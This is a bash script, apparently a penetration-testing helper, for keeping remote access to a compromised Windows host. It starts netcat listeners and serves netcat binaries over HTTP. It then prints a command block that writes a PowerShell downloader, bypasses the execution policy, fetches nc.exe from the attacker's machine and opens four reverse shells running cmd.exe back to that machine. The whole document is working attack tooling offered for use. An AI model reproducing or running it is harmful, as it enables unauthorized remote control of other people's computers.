#Created by github.com/vikrantrana1996
#Email: dukevikrant AT gmail DOT com
#Feel free to submit changes
GREEN='\033[0;32m'
NOCOLOR='\033[0m'
echo 'Enter remote windows type (32/64)'
read OS
echo 'Enter LHOST (Local IP)'
read LHOST
echo Going to listen on PORTS 61101, 61102, 61103 and 61104...
echo Creating tmux sessions win1, win2, win3 and win4...
tmux new-session -d -s win1 'nc -lvnp 61101'
tmux new-session -d -s win2 'nc -lvnp 61102'
tmux new-session -d -s win3 'nc -lvnp 61103'
tmux new-session -d -s win4 'nc -lvnp 61104'
cd nc_windows_binaries
echo Hosting nc binaries through python server on 8000...
tmux new-session -d -s pythonserver 'python3 -m http.server 8000'
echo
echo
echo -e ${GREEN}Paste the following in your remote windows shell...${NOCOLOR}
echo 'mkdir c:\ourdumps
echo $storageDir = "c:\ourdumps" > c:\ourdumps\wget.ps1
echo $webclient = New-Object System.Net.WebClient >> c:\ourdumps\wget.ps1
echo $url = "http://'$LHOST':8000/nc'$OS'.exe" >> c:\ourdumps\wget.ps1
echo $file = "c:\ourdumps\nc.exe" >> c:\ourdumps\wget.ps1
echo $webclient.DownloadFile($url,$file) >> c:\ourdumps\wget.ps1
echo Start-Job { C:\ourdumps\nc.exe '$LHOST' 61101 -e cmd.exe } >> c:\ourdumps\wget.ps1
echo Start-Job { C:\ourdumps\nc.exe '$LHOST' 61102 -e cmd.exe } >> c:\ourdumps\wget.ps1
echo Start-Job { C:\ourdumps\nc.exe '$LHOST' 61103 -e cmd.exe } >> c:\ourdumps\wget.ps1
echo Start-Job { C:\ourdumps\nc.exe '$LHOST' 61104 -e cmd.exe } >> c:\ourdumps\wget.ps1
echo Start-Sleep -s 100000 >> c:\ourdumps\wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File c:\ourdumps\wget.ps1'
echo
echo
echo -e ${GREEN}Access your reverse shell tmux sessions using...${NOCOLOR}
echo tmux a -t win1
echo tmux a -t win2
echo tmux a -t win3
echo tmux a -t win4
